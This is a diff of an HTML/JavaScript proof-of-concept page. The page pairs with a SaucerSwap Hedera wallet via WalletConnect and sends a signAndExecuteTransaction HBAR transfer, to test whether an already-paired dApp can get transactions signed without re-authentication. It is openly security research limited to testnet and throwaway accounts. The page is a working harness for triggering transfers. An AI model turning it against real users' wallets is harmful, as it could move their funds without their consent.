@@ -14,37 +14,35 @@
 </style>
 </head>
 <body>
-
+ 
 <h1>SaucerSwap Wallet — Unauthenticated Signing PoC</h1>
 <p>Pairs via WalletConnect, then sends a real <code>signAndExecuteTransaction</code> request
 (small testnet HBAR transfer) to confirm whether the wallet requires re-authentication
 before signing a request from an already-paired external dApp.</p>
-
+ 
 <div class="warn">
   <strong>Testnet + throwaway account only.</strong> This sends a real transaction if the
   wallet signs it. Never pair an account holding anything you care about. Discard the
   paired account after this test.
 </div>
-
+ 
 <p>WalletConnect Project ID: <input id="projectId" placeholder="from cloud.walletconnect.com"></p>
 <p>Network: <input id="network" value="testnet"></p>
-<button onclick="initWc()">1. Initialize</button>
-<button onclick="pair()">2. Pair with wallet</button>
+<button onclick="connectWallet()">Connect Wallet</button>
 <div id="uri"></div>
-<img id="qr" style="display:block; margin-top:8px;">
-
+ 
 <hr>
-
+ 
 <p>Owner (paired account — auto-filled after pairing): <input id="ownerId" value="0.0.10190152"></p>
 <p>Recipient (second account you control): <input id="recipientId" value="0.0.10130162"></p>
 <p>Amount to transfer (tinybars — default 1 HBAR = 100000000): <input id="amountTinybars" value="100000000"></p>
-
+ 
 <button onclick="checkBalance('owner')">3. Check owner balance (before)</button>
 <button onclick="sendSignAndExecute()">4. Send signAndExecuteTransaction</button>
 <button onclick="checkBalance('owner')">5. Check owner balance (after)</button>
-
+ 
 <pre id="log"></pre>
-
+ 
 <script>
 function log(msg) {
   const el = document.getElementById('log');
@@ -52,55 +50,56 @@ function log(msg) {
   el.scrollTop = el.scrollHeight;
   console.log(msg);
 }
-
+ 
 const HEDERA_METHODS = {
   SIGN_MESSAGE: 'hedera_signMessage',
   SIGN_AND_EXECUTE_TRANSACTION: 'hedera_signAndExecuteTransaction',
   EXECUTE_TRANSACTION: 'hedera_executeTransaction',
   SIGN_AND_EXECUTE_QUERY: 'hedera_signAndExecuteQuery'
 };
-
+ 
 let signClient = null;
 let session = null;
 let pairedAccountId = null;
 let network = 'testnet';
-
+ 
 function bytesToBase64(bytes) {
   let binary = '';
   const len = bytes.byteLength || bytes.length;
   for (let i = 0; i < len; i++) binary += String.fromCharCode(bytes[i]);
   return btoa(binary);
 }
-
-async function initWc() {
+ 
+async function connectWallet() {
   const projectId = document.getElementById('projectId').value.trim();
   network = document.getElementById('network').value.trim() || 'testnet';
   if (!projectId) { log('ERROR: enter a WalletConnect Project ID first.'); return; }
-  log('Loading WalletConnect SignClient…');
+ 
+  log('Loading WalletConnect SignClient + Modal…');
   try {
-    const mod = await import('https://esm.sh/@walletconnect/sign-client@2.11.0');
-    const SignClient = mod.SignClient;
-    signClient = await SignClient.init({
-      projectId,
-      metadata: {
-        name: 'SaucerSwap Wallet Security PoC',
-        description: 'Authorized research — WalletConnect auth-gate verification',
-        url: 'https://nathanogaga118.github.io',
-        icons: []
-      }
-    });
-    log('SignClient initialized.');
-    signClient.on('session_delete', () => { log('WARNING: session was disconnected by the wallet.'); session = null; });
-  } catch (e) {
-    log('Init failed: ' + e.message);
-  }
-}
-
-async function pair() {
-  if (!signClient) { log('ERROR: initialize first (step 1).'); return; }
-  log('Requesting pairing URI (chain: hedera:' + network + ')…');
-  try {
+    const [signMod, modalMod] = await Promise.all([
+      import('https://esm.sh/@walletconnect/sign-client@2.11.0'),
+      import('https://esm.sh/@walletconnect/modal@2.6.2')
+    ]);
+    const SignClient = signMod.SignClient;
+    const WalletConnectModal = modalMod.WalletConnectModal;
+ 
+    if (!signClient) {
+      signClient = await SignClient.init({
+        projectId,
+        metadata: {
+          name: 'SaucerSwap Wallet Security PoC',
+          description: 'Authorized research — WalletConnect auth-gate verification',
+          url: 'https://nathanogaga118.github.io',
+          icons: []
+        }
+      });
+      log('SignClient initialized.');
+      signClient.on('session_delete', () => { log('WARNING: session was disconnected by the wallet.'); session = null; });
+    }
+ 
     const chainId = 'hedera:' + network;
+    log('Requesting session proposal (chain: ' + chainId + ')…');
     const { uri, approval } = await signClient.connect({
       requiredNamespaces: {
         hedera: {
@@ -110,30 +109,27 @@ async function pair() {
         }
       }
     });
+ 
+    const modal = new WalletConnectModal({ projectId, chains: [chainId] });
+ 
     if (uri) {
+      modal.openModal({ uri });
+      log('WalletConnect modal opened — pick your wallet from the list, or scan the QR shown there with the phone running SaucerSwap.');
       document.getElementById('uri').innerHTML =
-        '<div>' + uri + '</div>' +
-        '<a href="' + uri + '" target="_blank">Open in wallet (deep link — only works if tapped ON the phone with SaucerSwap installed)</a><br>' +
-        '<button type="button" onclick="navigator.clipboard.writeText(\'' + uri + '\'); log(\'URI copied to clipboard.\')">Copy URI</button>';
-      try {
-        document.getElementById('qr').src =
-          'https://api.qrserver.com/v1/create-qr-code/?size=260x260&data=' + encodeURIComponent(uri);
-        log('QR code rendered — scan with the phone running SaucerSwap (Camera or in-app scanner), do NOT rely on the deep link if you generated this on a different device than your phone.');
-      } catch (qrErr) {
-        log('QR render failed: ' + qrErr.message + ' (use the deep link or copy the URI manually instead)');
-      }
+        '<button type="button" onclick="navigator.clipboard.writeText(\'' + uri + '\'); log(\'URI copied to clipboard.\')">Copy URI (fallback)</button>';
     }
+ 
     log('Waiting for wallet approval (2 minute timeout)…');
     const t0 = performance.now();
     const timeoutMs = 120000;
     const timeout = new Promise((_, reject) =>
       setTimeout(() => reject(new Error('Timed out after ' + (timeoutMs / 1000) +
-        's waiting for wallet approval. The wallet likely never received the pairing ' +
-        'request — confirm you scanned/opened the URI ON the device running SaucerSwap.')), timeoutMs)
+        's waiting for wallet approval.')), timeoutMs)
     );
     session = await Promise.race([approval(), timeout]);
+    modal.closeModal();
     log('Session approved. (' + (performance.now() - t0).toFixed(0) + 'ms)');
-
+ 
     const accounts = Object.values(session.namespaces).map(ns => ns.accounts).flat();
     log('Paired accounts: ' + JSON.stringify(accounts));
     if (accounts.length > 0) {
@@ -142,10 +138,10 @@ async function pair() {
       log('Owner field set to paired account: ' + pairedAccountId);
     }
   } catch (e) {
-    log('Pairing failed: ' + e.message);
+    log('Connect failed: ' + e.message);
   }
 }
-
+ 
 async function checkBalance(which) {
   const accountId = document.getElementById('ownerId').value.trim();
   if (!accountId) { log('ERROR: no account id set.'); return; }
@@ -162,7 +158,7 @@ async function checkBalance(which) {
     log('Balance check failed: ' + e.message);
   }
 }
-
+ 
 async function sendSignAndExecute() {
   if (!signClient || !session || !pairedAccountId) {
     log('ERROR: pair first (step 2) before sending a request.');
@@ -170,28 +166,28 @@ async function sendSignAndExecute() {
   }
   try {
     const { TransferTransaction, AccountId, Hbar, TransactionId } = sdk;
-
+ 
     const ownerStr = document.getElementById('ownerId').value.trim();
     const recipientStr = document.getElementById('recipientId').value.trim();
     const amountTinybars = document.getElementById('amountTinybars').value.trim();
-
+ 
     const owner = AccountId.fromString(ownerStr);
     const recipient = AccountId.fromString(recipientStr);
-
+ 
     log('Building TransferTransaction: ' + ownerStr + ' -> ' + recipientStr +
         ', amount=' + amountTinybars + ' tinybars');
-
+ 
     const tx = new TransferTransaction()
       .addHbarTransfer(owner, Hbar.fromTinybars(-amountTinybars))
       .addHbarTransfer(recipient, Hbar.fromTinybars(amountTinybars))
       .setTransactionId(TransactionId.generate(owner))
       .setNodeAccountIds([AccountId.fromString('0.0.3')])
       .freeze();
-
+ 
     const bytes = tx.toBytes();
     const base64Bytes = bytesToBase64(bytes);
     log('Built transaction bytes (base64), length: ' + base64Bytes.length);
-
+ 
     const chainId = 'hedera:' + network;
     const request = {
       topic: session.topic,
@@ -207,14 +203,14 @@ async function sendSignAndExecute() {
         }
       }
     };
-
+ 
     log('⏱ Sending ' + HEDERA_METHODS.SIGN_AND_EXECUTE_TRANSACTION +
         ' now — OBSERVE THE DEVICE for any biometric/PIN prompt starting this instant.');
     const t0 = performance.now();
     const sentAt = new Date().toISOString();
-
+ 
     const result = await signClient.request(request);
-
+ 
     const elapsed = (performance.now() - t0).toFixed(0);
     log('Response received after ' + elapsed + 'ms (sent at ' + sentAt + ').');
     log('Raw response: ' + JSON.stringify(result));
@@ -227,6 +223,23 @@ async function sendSignAndExecute() {
   }
 }
 </script>
-
+ 
 </body>
 </html>
+ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
